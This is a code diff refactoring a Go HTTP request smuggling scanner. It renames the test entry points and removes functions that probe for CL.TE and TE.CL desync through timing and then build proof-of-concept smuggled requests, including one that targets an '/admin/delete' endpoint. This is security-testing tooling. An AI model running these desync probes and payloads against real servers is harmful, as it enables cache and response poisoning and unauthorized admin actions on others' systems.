@@ -1,10 +1,8 @@
 package smuggler
 
 import (
-	"bufio"
 	"context"
 	"encoding/base64"
-	"encoding/hex"
 	"errors"
 	"fmt"
 	"io"
@@ -28,12 +26,12 @@ import (
 // sneaks in a request in another request, the synchronization will be affected resulting in
 // weird behaviours (users receiving response meant to be received by other users)
 type Desyncer interface {
-	test(*h1.Payload) (int, error) // returns 1 if connection timedout, 0 if normal response,\
-	testCLTE(*h1.Payload) bool     // 2 if disconnected before timeout
-	testTECL(*h1.Payload) bool
-	runCLTECL() (bool, error) // a wrapper for clte and tecl test
+	H1Test(*h1.Payload) (int, error) // returns 1 if connection timedout, 0 if normal response,\
+	// testCLTE(*h1.Payload) bool       // 2 if disconnected before timeout
+	// testTECL(*h1.Payload) bool
+	// runCLTECL() (bool, error) // a wrapper for clte and tecl test
 	GetCookie() error
-	Start() error
+	RunTests() error
 	ParseURL(host string) error
 }
 
@@ -44,6 +42,8 @@ type DesyncerImpl struct {
 	URL    *url.URL
 	Cookie string
 	Hdr    map[string]string
+
+	Done chan int
 }
 
 func (d *DesyncerImpl) ParseURL(uri string) error {
@@ -159,58 +159,17 @@ func (d *DesyncerImpl) GetCookie() error {
 	return nil
 }
 
-func (d *DesyncerImpl) Start() error {
-	if d.runCLTECL() {
-		return nil
-	}
-	return nil
+func (d *DesyncerImpl) RunTests() {
+	cl := CL{DesyncerImpl: d}
+	te := TE{DesyncerImpl: d}
+
+	go cl.Run()
+	go te.Run()
+
+	<-d.Done
 }
 
-func (d *DesyncerImpl) runCLTECL() bool {
-	log.Info().Str("endpoint", d.URL.String()).Msg("Running TECL and CLTE desync tests...")
-	f, err := os.OpenFile("smuggler/tests/clte/"+config.Glob.Test, os.O_RDONLY, 0644)
-	if err != nil {
-		log.Warn().Err(err).Msg("")
-		return false
-	}
-	defer f.Close()
-
-	ctr := 0
-	scanner := bufio.NewScanner(f)
-	for scanner.Scan() {
-		line := scanner.Text()
-		tmp, err := hex.DecodeString(line)
-		if err != nil {
-			log.Warn().Err(err).Msg("")
-			return false
-		}
-		payload := d.NewPl(string(tmp))
-		if d.testCLTE(payload) || d.testTECL(payload) {
-			ctr++
-			if config.Glob.ExitEarly {
-				log.Info().
-					Str("endpoint", d.URL.String()).
-					Str("status", "success").
-					Msgf("Test stopped on success: PoC payload stored in /result/%s directory", d.URL.Hostname())
-				return true
-			}
-		}
-	}
-	if ctr > 0 {
-		log.Info().
-			Str("endpoint", d.URL.String()).
-			Str("status", "success").
-			Msgf("finished TECL/CLTE desync tests: PoC payload stored in /result/%s directory", d.URL.Hostname())
-	} else {
-		log.Info().
-			Str("endpoint", d.URL.String()).
-			Str("status", "failure").
-			Msg("finished TECL/CLTE desync tests: no issues found")
-	}
-	return false
-}
-
-func (d *DesyncerImpl) test(p *h1.Payload) (int, error) {
+func (d *DesyncerImpl) H1Test(p *h1.Payload) (int, error) {
 	t := h1.Transport{}
 	q := d.URL.Query()
 	q.Set("t", fmt.Sprintf("%d", rand.Int32N(math.MaxInt32))) // avoid caching
@@ -237,121 +196,6 @@ func (d *DesyncerImpl) test(p *h1.Payload) (int, error) {
 		return 1, nil // connection timeout (probably)
 	}
 	return 0, nil // normal response
-}
-
-func (d *DesyncerImpl) testTECL(p *h1.Payload) bool {
-	p.Body = "0\r\n\r\nG"
-	p.Cl = 6
-
-	ctr := 0
-	for {
-		start := time.Now()
-		ret, err := d.test(p)
-		if ret != 1 {
-			if ret == -1 {
-				log.Debug().
-					Str("endpoint", d.URL.String()).
-					Str("payload", p.HdrPl).
-					Err(err).Msg("")
-			} else if ret == 2 {
-				log.Debug().
-					Str("endpoint", d.URL.String()).
-					Msg("disconnected before timeout")
-			}
-			return false
-		}
-		diff := time.Since(start)
-		p.Cl = 5
-		ret2, err := d.test(p)
-		if ret2 == -1 {
-			log.Debug().
-				Str("endpoint", d.URL.String()).
-				Err(err).Msg("")
-			return false
-		}
-		p.Cl = 6
-		if ret2 == 0 {
-			ctr++
-			if ctr < 3 {
-				continue
-			}
-			log.Info().
-				Str("endpoint", d.URL.String()).
-				Msgf("Potential TECL issue found - %s@%s://%s%s",
-					config.Glob.Method, d.URL.Scheme, d.URL.String(), d.URL.Path)
-			inner := fmt.Sprintf("GET /404 HTTP/1.1\r\nHost: %s\r\nContent-Length: 50\r\n\r\nX=", d.URL.Hostname())
-			tmp := fmt.Sprintf("1\r\nA\r\n%X\r\n%s\r\n0\r\n\r\n", len(inner), inner)
-			p.Body = tmp
-			p.Cl = len(fmt.Sprintf("1\r\nA\r\n%X\r\n", len(inner)))
-			// d.test(p)
-			// d.test(p)
-			d.GenReport(p, diff)
-			return true // instead return a bool if sth is found
-		}
-		log.Debug().
-			Str("endpoint", d.URL.String()).
-			Str("payload", p.HdrPl).
-			Err(err).Msg("TECL timeout on both length 5 and 6")
-		return false
-	}
-}
-
-// i may have a list of body payloads to try
-func (d *DesyncerImpl) testCLTE(p *h1.Payload) bool {
-	p.Body = "1\r\nG\r\n0\r\n\r\n"
-	p.Cl = 4
-
-	ctr := 0
-	for {
-		start := time.Now()
-		ret, err := d.test(p)
-		if ret != 1 {
-			if ret == -1 {
-				log.Debug().
-					Str("endpoint", d.URL.String()).
-					Str("payload", p.HdrPl).Err(err).Msg("")
-			} else if ret == 2 {
-				log.Debug().
-					Str("endpoint", d.URL.String()).
-					Msg("disconnected before timeout")
-			}
-			return false
-		}
-		diff := time.Since(start)
-		p.Cl = 11
-		// p.Body = "1\r\nG\r\n0\r\n\r\n"
-		ret2, err := d.test(p)
-		if ret2 == -1 {
-			log.Debug().
-				Str("endpoint", d.URL.String()).Err(err).Msg("")
-			return false
-		}
-		p.Cl = 4
-		p.Body = "1\r\n0"
-		if ret2 == 0 {
-			ctr++
-			if ctr < 3 {
-				continue
-			}
-			log.Info().
-				Str("endpoint", d.URL.String()).
-				Msgf("Potential CLTE issue found - %s@%s://%s%s", config.Glob.Method,
-					d.URL.Scheme, d.URL.Host, d.URL.Path)
-			inner := "GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 50\r\n\r\n" // host would be taken from a url given by the user
-			tmp := fmt.Sprintf("1\r\nA\r\n0\r\n\r\n%s", inner)
-			p.Body = tmp
-			p.Cl = len(p.Body)
-			// d.test(p) //
-			// d.test(p) // to make sure the queued req proceeds
-			d.GenReport(p, diff)
-			return true
-		}
-		log.Debug().
-			Str("endpoint", d.URL.String()).
-			Str("payload", p.HdrPl).
-			Err(err).Msg("CLTE timeout on both length 4 and 11")
-		return false
-	}
 }
 
 func (d *DesyncerImpl) GenReport(p *h1.Payload, t time.Duration) {
